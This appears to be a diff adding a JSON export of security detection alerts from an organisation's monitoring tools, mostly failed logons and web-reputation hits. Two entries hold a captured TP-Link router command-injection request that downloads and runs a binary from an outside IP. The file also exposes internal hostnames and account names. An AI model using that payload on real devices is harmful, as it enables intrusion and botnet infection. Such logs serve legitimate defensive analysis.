@@ -1,0 +1,340 @@
+[
+    {
+        "detection_name": "Failed Logon via SMB Using Default Windows Convention Name",
+        "severity_level": "info",
+        "description": "Failed logon via SMB from a host using the windows default convention name has been detected",
+        "endpoint": "SVRWBKPB01",
+        "src_attack": null,
+        "shost": null,
+        "dst_attack": null,
+        "dhost": null,
+        "request": null,
+        "rulename": null,
+        "app": null,
+        "botUrl": null,
+        "userAgent": null,
+        "pAttackPhase": null,
+        "remarks": null,
+        "objectCmd": null,
+        "detected_by": "751",
+        "uuid": "1bd3de92-d687-4f8f-8f31-1086649f1331",
+        "dataHash": "37ece00782b517d406281bf19bdea406c29d1cb386700b0e24afde7b27698195"
+    },
+    {
+        "detection_name": "Untested Domain Detections Of Web Reputation Services",
+        "severity_level": "info",
+        "description": "A domain untested by Web Reputation Services (WRS) was accessed.",
+        "endpoint": "10.0.127.50",
+        "src_attack": [
+            "185.224.128.43"
+        ],
+        "shost": "185.224.128.43",
+        "dst_attack": [
+            "10.0.127.50"
+        ],
+        "dhost": "10.0.127.50",
+        "request": "https://103.41.110.21/",
+        "rulename": null,
+        "app": "HTTP",
+        "botUrl": null,
+        "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",
+        "pAttackPhase": null,
+        "remarks": "[\"URL: https://103.41.110.21/\"]",
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "cdc2d502-9720-47d4-8c65-265267c3d5ab",
+        "dataHash": "471e385d9d70d5ba4af8f6667bc87c4c82e1f8e4debe91f4795c55e058c959e4"
+    },
+    {
+        "detection_name": "Untested Domain Detections Of Web Reputation Services",
+        "severity_level": "info",
+        "description": "A domain untested by Web Reputation Services (WRS) was accessed.",
+        "endpoint": "10.0.127.124",
+        "src_attack": [
+            "185.224.128.43"
+        ],
+        "shost": "185.224.128.43",
+        "dst_attack": [
+            "10.0.127.124"
+        ],
+        "dhost": "10.0.127.124",
+        "request": "https://103.41.110.73/",
+        "rulename": null,
+        "app": "HTTP",
+        "botUrl": null,
+        "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",
+        "pAttackPhase": null,
+        "remarks": "[\"URL: https://103.41.110.73/\"]",
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "b021782c-02fd-4330-8a3b-8b14fb9c12c6",
+        "dataHash": "722a26207970fe4b43804152ca293a527bfa04c02a5f4fe98de9f9028be6ca0f"
+    },
+    {
+        "detection_name": "Untested Domain Detections Of Web Reputation Services",
+        "severity_level": "info",
+        "description": "A domain untested by Web Reputation Services (WRS) was accessed.",
+        "endpoint": "10.0.127.123",
+        "src_attack": [
+            "164.92.194.208"
+        ],
+        "shost": "portscanner-fra1-04.prod.cyberresilience.io",
+        "dst_attack": [
+            "10.0.127.123"
+        ],
+        "dhost": "10.0.127.123",
+        "request": "https://103.41.110.76/",
+        "rulename": null,
+        "app": "HTTP",
+        "botUrl": null,
+        "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0",
+        "pAttackPhase": null,
+        "remarks": "[\"URL: https://103.41.110.76/\"]",
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "00b095d5-590c-4bd1-ab4f-de90aa7b0d59",
+        "dataHash": "e2d2c0c5d556a555b80cfac9ebb5ef5c267f681c0b4885e05c38fe7ea3be3e3b"
+    },
+    {
+        "detection_name": "Untested Domain Detections Of Web Reputation Services",
+        "severity_level": "info",
+        "description": "A domain untested by Web Reputation Services (WRS) was accessed.",
+        "endpoint": "10.0.10.13",
+        "src_attack": [
+            "84.54.51.41"
+        ],
+        "shost": "hosted-by.pfcloud.io",
+        "dst_attack": [
+            "10.0.10.13"
+        ],
+        "dhost": "10.0.10.13",
+        "request": "https://103.41.110.110:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F94.156.79.193%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60)",
+        "rulename": null,
+        "app": "HTTP",
+        "botUrl": null,
+        "userAgent": "Go-http-client/1.1",
+        "pAttackPhase": null,
+        "remarks": "[\"URL: https://103.41.110.110:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F94.156.79.193%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60)\"]",
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "1ab314f0-e774-4893-a3c0-45d37a9b2969",
+        "dataHash": "dd3540bfbd24126e8fb2f6544f233b7beb202b2f5c00b41307a8a4fefcfafe40"
+    },
+    {
+        "detection_name": "Wmi Execute Method Request Detected - Inbound",
+        "severity_level": "info",
+        "description": "Network activity involving DCE RPC, which is associated with WMI Execution, was detected.",
+        "endpoint": "10.0.127.123",
+        "src_attack": [
+            "10.1.50.132"
+        ],
+        "shost": "svrwpswapp",
+        "dst_attack": [
+            "10.0.127.123"
+        ],
+        "dhost": "10.0.127.123",
+        "request": null,
+        "rulename": null,
+        "app": "DCE-RPC",
+        "botUrl": null,
+        "userAgent": null,
+        "pAttackPhase": "Lateral Movement",
+        "remarks": "[\"IP address: 10.1.50.132\"]",
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "490655f9-4f15-4467-9aa9-98783ed77487",
+        "dataHash": "1e8035c6b1ae112e8845b72cf6a39960e39e61c1733b23852b2db646f94f0b0a"
+    },
+    {
+        "detection_name": "Windows Logon Attempt Failure",
+        "severity_level": "info",
+        "description": "Detects windows events with logon attempt failure which might indicate brute force attempt.",
+        "endpoint": "SVRWPCAS01.pelindo.co.id",
+        "src_attack": null,
+        "shost": "SVRWPCAS01",
+        "dst_attack": null,
+        "dhost": null,
+        "request": null,
+        "rulename": null,
+        "app": null,
+        "botUrl": null,
+        "userAgent": null,
+        "pAttackPhase": null,
+        "remarks": "WinEvtLog: Security: AUDIT_FAILURE(4625): Microsoft-Windows-Security-Auditing: (no user): no domain: SVRWPCAS01.pelindo.co.id: An account failed to log on. Subject:  Security ID:  S-1-5-18  Account Name:  SVRWPCAS01$  Account Domain:  PELINDO  Logon ID:  0x3e7  Logon Type:   8  Account For Which Logon Failed:  Security ID:  S-1-0-0  Account Name:  serepina@pelindo.co.id  Account Domain:    Failure Information:  Failure Reason:  %%2310  Status:   0xc000006e  Sub Status:  0xc0000072  Process Information:  Caller Process ID: 0x16d8  Caller Process Name: C:\\Program Files\\Microsoft\\Exchange Server\\V15\\Bin\\MSExchangeFrontendTransport.exe  Network Information:  Workstation Name: SVRWPCAS01  Source Network Address: -  Source Port:  -  Detailed Authentication Information:  Logon Process:  Advapi    Authentication Package: Negotiate  Transited Services: -  Package Name (NTLM only): -  Key Length:  0  This event is generated when a logon request fails. It is generated on the computer where access was attempted.  ",
+        "objectCmd": null,
+        "detected_by": "Server & Workload Protection",
+        "uuid": "d1958f21-d6c2-4262-aeec-360742c7713e",
+        "dataHash": "d7b98c20726758d10aa0ab0ff1eed32292b310e35751eda61162e2fa6bae2976"
+    },
+    {
+        "detection_name": "Windows Logon Attempt Failure",
+        "severity_level": "info",
+        "description": "Detects windows events with logon attempt failure which might indicate brute force attempt.",
+        "endpoint": "SVRWPH2H01",
+        "src_attack": [
+            "10.1.50.132"
+        ],
+        "shost": "SVRWPH2H01",
+        "dst_attack": null,
+        "dhost": null,
+        "request": null,
+        "rulename": null,
+        "app": null,
+        "botUrl": null,
+        "userAgent": null,
+        "pAttackPhase": null,
+        "remarks": "WinEvtLog: Security: AUDIT_FAILURE(4625): Microsoft-Windows-Security-Auditing: (no user): no domain: SVRWPH2H01: An account failed to log on. Subject:  Security ID:  S-1-0-0  Account Name:  -  Account Domain:  -  Logon ID:  0x0  Logon Type:   3  Account For Which Logon Failed:  Security ID:  S-1-0-0  Account Name:  solarwinds.reg3  Account Domain:  pelindo  Failure Information:  Failure Reason:  %%2313  Status:   0xc000006d  Sub Status:  0xc0000064  Process Information:  Caller Process ID: 0x0  Caller Process Name: -  Network Information:  Workstation Name: SVRWPSWAPP  Source Network Address: 10.1.50.132  Source Port:  60129  Detailed Authentication Information:  Logon Process:  NtLmSsp   Authentication Package: NTLM  Transited Services: -  Package Name (NTLM only): -  Key Length:  0  This event is generated when a logon request fails. It is generated on the computer where access was attempted.  ",
+        "objectCmd": null,
+        "detected_by": "Server & Workload Protection",
+        "uuid": "c8d41933-f186-4ce6-ac76-b72e1819d576",
+        "dataHash": "eebaad73842e265464c7abe6426c86e7a51d3cd50434e8e5f32ddce82bb24f7d"
+    },
+    {
+        "detection_name": "Untested Domain Detections Of Web Reputation Services",
+        "severity_level": "info",
+        "description": "A domain untested by Web Reputation Services (WRS) was accessed.",
+        "endpoint": "10.0.127.120",
+        "src_attack": [
+            "84.54.51.41"
+        ],
+        "shost": "hosted-by.pfcloud.io",
+        "dst_attack": [
+            "10.0.127.120"
+        ],
+        "dhost": "10.0.127.120",
+        "request": "https://103.41.110.59:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F94.156.79.193%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60)",
+        "rulename": null,
+        "app": "HTTP",
+        "botUrl": null,
+        "userAgent": "Go-http-client/1.1",
+        "pAttackPhase": null,
+        "remarks": "[\"URL: https://103.41.110.59:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F94.156.79.193%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60)\"]",
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "7eba7652-d0e8-4348-b7cd-469565c0cdc8",
+        "dataHash": "6eb30e98a2aafe868e508376156456d325dd1ac93cb41ea9433bec68cb4a0082"
+    },
+    {
+        "detection_name": "Untested Domain Detections Of Web Reputation Services",
+        "severity_level": "info",
+        "description": "A domain untested by Web Reputation Services (WRS) was accessed.",
+        "endpoint": "10.0.127.80",
+        "src_attack": [
+            "167.172.89.248"
+        ],
+        "shost": "167.172.89.248",
+        "dst_attack": [
+            "10.0.127.80"
+        ],
+        "dhost": "10.0.127.80",
+        "request": "https://103.41.110.16/",
+        "rulename": null,
+        "app": "HTTP",
+        "botUrl": null,
+        "userAgent": "Mozilla/5.0 zgrab/0.x",
+        "pAttackPhase": null,
+        "remarks": "[\"URL: https://103.41.110.16/\"]",
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "67e477fe-0794-4f60-a36e-8e3dfc4b8f28",
+        "dataHash": "d6ed09bf5c300f7f9de0a0e70a212b77ccbb56869dcb46495fec2c216a8d1b61"
+    },
+    {
+        "detection_name": "Untested Domain Detections Of Web Reputation Services",
+        "severity_level": "info",
+        "description": "A domain untested by Web Reputation Services (WRS) was accessed.",
+        "endpoint": "10.0.147.28",
+        "src_attack": [
+            "3.8.114.105"
+        ],
+        "shost": "ec2-3-8-114-105.eu-west-2.compute.amazonaws.com",
+        "dst_attack": [
+            "10.0.147.28"
+        ],
+        "dhost": "10.0.147.28",
+        "request": "https://103.41.110.50/cgi-bin/login.cgi",
+        "rulename": null,
+        "app": "HTTP",
+        "botUrl": null,
+        "userAgent": "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/networks/ip-networks/deepfield/genome/)'",
+        "pAttackPhase": null,
+        "remarks": "[\"URL: https://103.41.110.50/cgi-bin/login.cgi\"]",
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "2b8a8bde-3dc5-4679-8604-394eaf95820c",
+        "dataHash": "cba0895a73cd7a673ed90b3876cdc638ebdb5dd65e566281a5195720702181cf"
+    },
+    {
+        "detection_name": "Untested Domain Detections Of Web Reputation Services",
+        "severity_level": "info",
+        "description": "A domain untested by Web Reputation Services (WRS) was accessed.",
+        "endpoint": "10.0.127.167",
+        "src_attack": [
+            "10.0.127.167"
+        ],
+        "shost": "10.0.127.167",
+        "dst_attack": [
+            "183.91.85.163"
+        ],
+        "dhost": "183.91.85.163",
+        "request": "https://183.91.85.163:2084/csap/services/OutboundSendNota",
+        "rulename": null,
+        "app": "HTTP",
+        "botUrl": null,
+        "userAgent": "RestSharp/106.15.0.0",
+        "pAttackPhase": null,
+        "remarks": "[\"URL: https://183.91.85.163:2084/csap/services/OutboundSendNota\"]",
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "773cea5e-67d5-414b-a417-538f811dfad3",
+        "dataHash": "c8e8e28dc87c169f4a877da177111457a54b279527bbbc4050d60be8a3166b31"
+    },
+    {
+        "detection_name": "Windows Logon Attempt Failure",
+        "severity_level": "info",
+        "description": "Detects windows events with logon attempt failure which might indicate brute force attempt.",
+        "endpoint": "AD-02.inaport4.co.id",
+        "src_attack": [
+            "172.10.1.75"
+        ],
+        "shost": "AD-02",
+        "dst_attack": null,
+        "dhost": null,
+        "request": null,
+        "rulename": null,
+        "app": null,
+        "botUrl": null,
+        "userAgent": null,
+        "pAttackPhase": null,
+        "remarks": "WinEvtLog: Security: AUDIT_FAILURE(4625): Microsoft-Windows-Security-Auditing: (no user): no domain: AD-02.inaport4.co.id: An account failed to log on. Subject:  Security ID:  S-1-5-18  Account Name:  AD-02$  Account Domain:  INAPORT4  Logon ID:  0x3e7  Logon Type:   3  Account For Which Logon Failed:  Security ID:  S-1-0-0  Account Name:  rakhmatyamin  Account Domain:  INAPORT4  Failure Information:  Failure Reason:  %%2313  Status:   0xc000006d  Sub Status:  0xc000006a  Process Information:  Caller Process ID: 0x2a4  Caller Process Name: C:\\Windows\\System32\\lsass.exe  Network Information:  Workstation Name: AD-02  Source Network Address: 172.10.1.75  Source Port:  46508  Detailed Authentication Information:  Logon Process:  Advapi    Authentication Package: MICROSOFT_AUTHENTICATION_PACKAGE_V1_0  Transited Services: -  Package Name (NTLM only): -  Key Length:  0  This event is generated when a logon request fails. It is generated on the computer where access was attempted.  ",
+        "objectCmd": null,
+        "detected_by": "Server & Workload Protection",
+        "uuid": "3d562c11-4ea7-42aa-ab84-bf68f7a41242",
+        "dataHash": "1c05a3670b7a1d682417fd252e500272767dc5bfb001afb4b1a718304a76700e"
+    },
+    {
+        "detection_name": "Possible Malware Traffic",
+        "severity_level": "info",
+        "description": "Possible malware traffic detected by Deep Discovery Inspector.",
+        "endpoint": "10.0.127.210",
+        "src_attack": [
+            "10.0.127.210"
+        ],
+        "shost": "10.0.127.210",
+        "dst_attack": [
+            "36.64.29.179"
+        ],
+        "dhost": "mail.portdevco.com",
+        "request": "https://peo.pelindo.id/disposisi/disposisi_nd?nipp=JyKeSfGpnp/XQVC0atARut0pvlX3fGbrmo5UMd6MfN9/hcW1bv___66IbHtbaVY___AaayxSKkcMFJaA3szOjcsZWQ==&id=2zpaKKVpwmgJRv15AhuHVeka0WVx3QUkeMD3w4ieo7NlqYslCX5bP2PaFpjKLsLuNfAQt4XJ0ieOLHV7GOoMNA==&nama=FvExgagpX4sWIv2___rhUdO0tnQiyyXrlVfhKHkP38zJfDB32yq7k9ttDo3qaHB___kaCm2xT4uIcbiAzzipiMCudw==&kdjab=/lbraNEqbVwTcDGX7W33NvdFpvIvdA0KU___aKNcus45gjjWAfC3Gy9j1J3xhyefB6K___L3luBoKSOqV70wGbPKwA==",
+        "rulename": null,
+        "app": "SMTP",
+        "botUrl": null,
+        "userAgent": null,
+        "pAttackPhase": null,
+        "remarks": "[\"Subject: [PEO][APP] Penyampaian Realisasi Penggunaan Biaya Direktorat Komersial dan Teknik PT Pelindo Solusi Logistik periode sampai dengan 31 Maret 2024\", \"IP address: 36.64.29.179\"]",
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "7bb20140-1df8-438a-a9e5-1ccd9d4a6052",
+        "dataHash": "d095c7deaae209b1ce3487c4195e2cf533f2e6589be3da0a4e0ce65d6fd06775"
+    }
+]
